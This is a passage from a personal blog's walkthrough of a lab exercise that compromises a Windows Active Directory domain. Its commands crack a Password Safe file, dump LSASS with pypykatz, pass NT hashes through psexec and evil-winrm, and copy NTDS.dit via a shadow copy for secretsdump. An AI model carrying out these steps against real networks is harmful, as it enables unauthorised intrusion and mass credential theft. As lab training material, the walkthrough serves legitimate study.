</code></pre><h2 id=06-gaining-access-to-file01>06. Gaining Access to FILE01<a href=#06-gaining-access-to-file01 class=post-heading__anchor aria-hidden=true>#</a></h2><p>Lets Focus on the ports that we have open on FILE01, we can see that we can access this machine a few different ways, lets try the least intrusive method of checking the shares available first, and maybe connecting through psexec, we can also try to RDP but i typically save that for a last resort.</p><pre tabindex=0><code>th@ddeu$ sudo proxychains smbclient -U &#34;NEXURA\hwilliam%&lt;REDACTED&gt;&#34; -L //172.16.119.10
--SNIP--
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        HR              Disk      
        IPC$            IPC       Remote IPC
        IT              Disk      
        MANAGEMENT      Disk      
        PRIVATE         Disk      
        TRANSFER        Disk    
--SNIP--

th@ddeu$ sudo proxychains impacket-psexec NEXURA/hwilliam:&lt;REDACTED&gt;@172.16.119.10
--SNIP--
[*] Requesting shares on 172.16.119.10.....
[-] share &#39;ADMIN$&#39; is not writable.
[-] share &#39;C$&#39; is not writable.
[*] Found writable share HR
[*] Uploading file YDuMZAjX.exe
[*] Opening SVCManager on 172.16.119.10.....
[-] Error opening SVCManager on 172.16.119.10.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
--SNIP--


th@ddeu$ proxychains xfreerdp /v:172.16.119.10 /d:nexura.htb /u:hwilliam /p:&#39;&lt;REDACTED&gt;&#39; /cert:ignore /dynamic-resolution /drive:linux,/home/th/filetransfer
--SNIP--
[14:04:26:177] [315880:315882] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 0: Success
[14:04:26:177] [315880:315882] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.10:3389  ...  OK
[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 0: Success
[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[14:04:27:629] [315880:315882] [ERROR][com.freerdp.core] - freerdp_post_connect failed
</code></pre><p>As we can see our remote access attempts did not work, so were just gonna take a look around the shares to see if theres anything of interest there. In the interest of time. This is an unprivileged user so i couldnt access the C$ or ADMIN$ shares so in the interest of brevity im gonna skip to the one that actually worked.</p><pre tabindex=0><code>th@ddeu$ sudo proxychains smbclient -U &#34;NEXURA\hwilliam%&lt;REDACTED&gt;&#34; //172.16.119.10/HR
smb: \&gt; dir                                                                                    
  .                                   D        0  Wed Jul 16 13:58:02 2025
  ..                                  D        0  Wed Jul 16 13:58:02 2025
  2024                                D        0  Tue Apr 29 11:08:16 2025
  2025                                D        0  Tue Apr 29 11:07:24 2025    
  Archive                             D        0  Tue Apr 29 11:10:24 2025
smb: \&gt; cd Archive                    
smb: \Archive\&gt; dir                                                                         
--SNIP--                 
  Employee-Passwords_OLD.plk          A       48  Tue Apr 29 10:13:43 2025
  Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 10:09:57 2025                     
  Employee-Passwords_OLD_011.ibak      A      856  Tue Apr 29 10:10:02 2025
  Employee-Passwords_OLD_012.ibak      A      904  Tue Apr 29 10:10:04 2025
  Employee-Passwords_OLD_013.ibak      A      952  Tue Apr 29 10:10:07 2025
--SNIP--
smb: \Archive\&gt; mget Employee-Passwords*
</code></pre><p>From here, doing some research into the psafe3 filestype uncovers a 2john tool that we can use on the file to extract hashes for cracking</p><pre tabindex=0><code>th@ddeu$ pwsafe2john ./Employee-Passwords_OLD.psafe3 &gt; /tmp/employee_psafe.txt
th@ddeu$ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/employee_psafe.txt
--SNIP--
&lt;REDACTED&gt;   (Employee-Passwords_OLD)   
--SNIP--
th@ddeu$ sudo apt install passwordsafe
th@ddeu$ 
</code></pre><p>From here we have to download the app and open the gui to copy and paste out the passwords.<br><picture><source type=image/webp srcset="/blog/20250716/20250716_passwordsafe_lockscreen_hu64919964072515204.webp 300w,/blog/20250716/20250716_passwordsafe_lockscreen_hu3212947936828714218.webp 500w,/blog/20250716/20250716_passwordsafe_lockscreen_hu12467022579217132431.webp 559w" sizes="(max-width: 499px) 300px,(max-width: 699px) 500px,559px"><img src=/blog/20250716/20250716_passwordsafe_lockscreen.PNG srcset="/blog/20250716/20250716_passwordsafe_lockscreen_hu9799332821799858117.PNG 300w,/blog/20250716/20250716_passwordsafe_lockscreen_hu8081080080988560141.PNG 500w,/blog/20250716/20250716_passwordsafe_lockscreen_hu9959990910898471479.PNG 559w" sizes="(max-width: 499px) 300px,(max-width: 699px) 500px,559px" alt=Lockscreen loading=lazy width=559 height=331>
</picture><picture><source type=image/webp srcset="/blog/20250716/20250716_passwordsafe_unlocked_hu5296987010597875603.webp 300w,/blog/20250716/20250716_passwordsafe_unlocked_hu9015830520415924534.webp 403w" sizes="(max-width: 499px) 300px,403px"><img src=/blog/20250716/20250716_passwordsafe_unlocked.PNG srcset="/blog/20250716/20250716_passwordsafe_unlocked_hu974408354506655341.PNG 300w,/blog/20250716/20250716_passwordsafe_unlocked_hu6550414294212982515.PNG 403w" sizes="(max-width: 499px) 300px,403px" alt=Unlocked loading=lazy width=403 height=320></picture><br>The resulting creds are as follows</p><pre tabindex=0><code>
#Domain Users
## bdavid / &lt;REDACTED&gt;
## stom / &lt;REDACTED&gt;
## hwilliam / &lt;REDACTED&gt;
</code></pre><h2 id=07-gaining-access-to-jump01>07. Gaining Access to JUMP01<a href=#07-gaining-access-to-jump01 class=post-heading__anchor aria-hidden=true>#</a></h2><p>Taking a look ath these creds, the only ones that are still valid are bdavid&rsquo;s unfortunately his credentials dont give us access to any files of interest</p><pre tabindex=0><code>th@ddeu$ sudo proxychains smbclient -U &#34;NEXURA\bdavid%&lt;REDACTED&gt;&#34; -L //172.16.119.10
--SNIP--

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        HR              Disk      
        IPC$            IPC       Remote IPC
        IT              Disk      
        MANAGEMENT      Disk      
        PRIVATE         Disk      
        TRANSFER        Disk   
--SNIP--
</code></pre><p>From here we can use our newly found credentials to attempt remote access to the other machines. For brevity&rsquo;s sake im going to omit the numerous failed attempts, but i tried psexec and xfreerdp on both other machines with both sets of credentials, and was able to get on to the JUMP01 server with bdavid via rdp.</p><pre tabindex=0><code>th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:&#39;&lt;REDACTED&gt;&#39; /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
</code></pre><p>A quick check shows us that bdavid is allowed to launch an administrative shell which makes our lives a lot easier. At this point we can upload mimikatz if we would like, but i wanted to try the method of dumping LSASS since for some reason it wouldnt work for me in the earlier labs using the GUI method in Task Manager
<picture><source type=image/webp srcset="/blog/20250716/20250726_lsass_hu13540630601217665480.webp 300w,/blog/20250716/20250726_lsass_hu2048670700734707101.webp 500w,/blog/20250716/20250726_lsass_hu2710943186084433918.webp 700w" sizes="(max-width: 499px) 300px,(max-width: 699px) 500px,700px"><img src=/blog/20250716/20250726_lsass.PNG srcset="/blog/20250716/20250726_lsass_hu4375776853024754785.PNG 300w,/blog/20250716/20250726_lsass_hu5995914943271591875.PNG 500w,/blog/20250716/20250726_lsass_hu12816581040612058081.PNG 700w" sizes="(max-width: 499px) 300px,(max-width: 699px) 500px,700px" alt="Lsass Dump" loading=lazy width=779 height=676>
</picture>The resulting dump was in <code>C:\Users\bdavid\AppData\Local\Temp\lsass.DMP</code> which I could move back to my machine using the drive that i mounted in the RDP command. With that out of the way I can grab new credentials using pypykatz. This is a pretty long file, but the lines of interest are here. Now we have a hash for stom</p><pre tabindex=0><code>th@ddeu$ pypykatz lsa minidump lsass.DMP | less -N
--SNIP--
     76         == MSV ==
     77                 Username: JUMP01$
     78                 Domain: NEXURA
     79                 LM: NA
     80                 NT: &lt;REDACTED&gt;
     81                 SHA1: 8d45e4af84cfe51b8a6f8f483e955f0b0f281abc
     82                 DPAPI: 0000000000000000000000000000000000000000
--SNIP--
    293         == MSV ==
    294                 Username: stom
    295                 Domain: NEXURA
    296                 LM: NA
    297                 NT: &lt;REDACTED&gt;
    298                 SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
    299                 DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
--SNIP--
</code></pre><p>At this point we only have the hash and if we cant PTH with RDP unless we enable restricted admin mode, so we will have to try other methods of gaining access to the domain controller. At this point i was going to try psexec or evil-winrm and psexec is a lot easier so i went with that then i enabled restricted admin mode and conected to the machine via RDP.</p><h2 id=08-gaining-access-to-dc01>08. Gaining Access to DC01<a href=#08-gaining-access-to-dc01 class=post-heading__anchor aria-hidden=true>#</a></h2><pre tabindex=0><code>th@ddeu$ sudo proxychains impacket-psexec NEXURA/stom@172.16.119.10 -hashes :&lt;REDACTED&gt;
--SNIP--
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

th@ddeu$ proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:stom /pth:&#39;&lt;REDACTED&gt;&#39; /cert:ignore /dynamic-resolution /drive:linux,/home/$USER/filetransfer
</code></pre><p>This did not work so im going to back out and use evil-winrm to connect to the machine</p><pre tabindex=0><code>th@ddeu$ sudo apt install krb5-user
th@ddeu$ sudo vim /etc/krb5.conf
# MAKE SURE YOUR CONF HAS THE FOLLOWING
--SNIP--
     default_realm = NEXURA.HTB
--SNIP--
[realms]
     NEXURA.HTB = {
          kdc = DC01.NEXURA.HTB
     }
--SNIP--
th@ddeu$ sudo vim /etc/hosts
--SNIP--
#MAKE SURE YOUR FILE HAS THE FOLLOWING
172.16.119.11 DC01 dc01 DC01.NEXURA.HTB dc01.nexura.htb NEXURA.HTB nexura.htb
--SNIP--
th@ddeu$ proxychains evil-winrm -i DC01 -u stom -H &lt;REDACTED&gt; 
*Evil-WinRM* PS C:\Users\stom\Documents&gt; 
</code></pre><p>Now that we have access to the system we can try to grab the SYSTEM and ntds.dit files to dump them and get the administrator hash that we need to pass this lab.We can do this most easily by just creating a volume shadow copy and copying the files to our local system</p><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\stom\Documents&gt; vssadmin CREATE SHADOW /for=C: 
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool                           
(C) Copyright 2001-2013 Microsoft Corp.                                
Successfully created shadow copy for &#39;C:\&#39;                                                               
    Shadow Copy ID: {1a19cedf-7113-402f-a03a-cfc2bf69bb9c}                                Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 

*Evil-WinRM* PS C:\Users\stom\Documents&gt; cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit

*Evil-WinRM* PS C:\Users\stom\Documents&gt; cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SYSTEM C:\SYSTEM
# THIS TAKES A WHILE
*Evil-WinRM* PS C:\Users\stom\Documents&gt; download C:\ntds.dit
*Evil-WinRM* PS C:\Users\stom\Documents&gt; download C:\SYSTEM
</code></pre><h2 id=09-cracking-the-creds>09. Cracking the creds<a href=#09-cracking-the-creds class=post-heading__anchor aria-hidden=true>#</a></h2><p>Finally we can use secretsdump to grab the hash we need for this challenge</p><pre tabindex=0><code>th@ddeu$ impacket-secretsdump -ntds ./NTDS.dit -system ./SYSTEM LOCAL                                                                                                                
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies
[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778                                        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
[*] Reading and decrypting hashes from ./NTDS.dit
--SNIP--
</code></pre></div></article></div><div class=sidebar><aside class=bio><div class="jr__item jr-basics__item"><div class=jr-basics__image><img src=https://i.postimg.cc/JhB8qYYT/adminprivileges-doctor-doom-as-a-young-African-American-man-wit-69ef1de7-69d7-4a18-ac87-9033e3b1fc34.png alt="Picture of Thaddeus Koenig" width=250 height=250></div><div class=jr-basics__name>Thaddeus Koenig</div><div class=jr-basics__label>Person Who Does Things</div><div class=jr-basics__email>admin@thaddeuskoenig.com</div><div class=jr-basics__summary>Im a simple guy who likes computers. I derive a lot of passion and purpose from digital security and open source technology. In my free time I like cooking and working out. This blog is mainly an excercise in documentation, but I hope you can find something useful here.</div><div class=jr-basics__location-city>Annapolis, MD</div><hr><div class="jr-basics__profile jr-basics__profile--col"><a href=https://github.com/adminprivileges target=_blank rel="noreferrer me"><div class=jr-basics__profile-item><div class=jr-basics__profile-icon><svg role="img" viewBox="0 0 24 24"><title>GitHub</title><path d="M12 .297c-6.63.0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577.0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93.0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176.0.0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22.0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22.0 1.606-.015 2.896-.015 3.286.0.315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></div><div class=jr-basics__profile-username>adminprivileges</div></div></a></div><hr><div class="jr-basics__profile jr-basics__profile--row"><a href=https://linkedin.com/in/thaddeuskoenig target=_blank rel="noreferrer me"><div class=jr-basics__profile-item><div class=jr-basics__profile-icon><svg role="img" viewBox="0 0 24 24"><title>LinkedIn</title><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601.0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144.0-2.063-.926-2.063-2.065.0-1.138.92-2.063 2.063-2.063 1.14.0 2.064.925 2.064 2.063.0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.222.0h.003z"/></svg></div></div></a></div></div></aside></div></main><footer><div class=copyright>© 2025 Thaddeus Koenig</div></footer><script src=/js/main.d90e807078295d4aae45235a8fb2bafba82b70e4ae19a60347215ec684c1539ecd0a9ab9fc6bcf9cc64fd4d9d35ff6287dd26f9b34beaa0e223f28a7959042e5.js integrity="sha512-2Q6AcHgpXUquRSNaj7K6+6grcOSuGaYDRyFexoTBU57NCpq5/GvPnMZP1NnTX/YofdJvmzS+qg4iPyinlZBC5Q=="></script><script src=/js/flexsearch.1ab5b109bf2ed66903ae10907394415caa12f5c0ee66bc80088ba135ec4a751f62e4961d6a7303b562e4db724392da85945b763b8e1858ea3fd05cc36f9b8156.js integrity="sha512-GrWxCb8u1mkDrhCQc5RBXKoS9cDuZryACIuhNexKdR9i5JYdanMDtWLk23JDktqFlFt2O44YWOo/0FzDb5uBVg=="></script></div></body></html>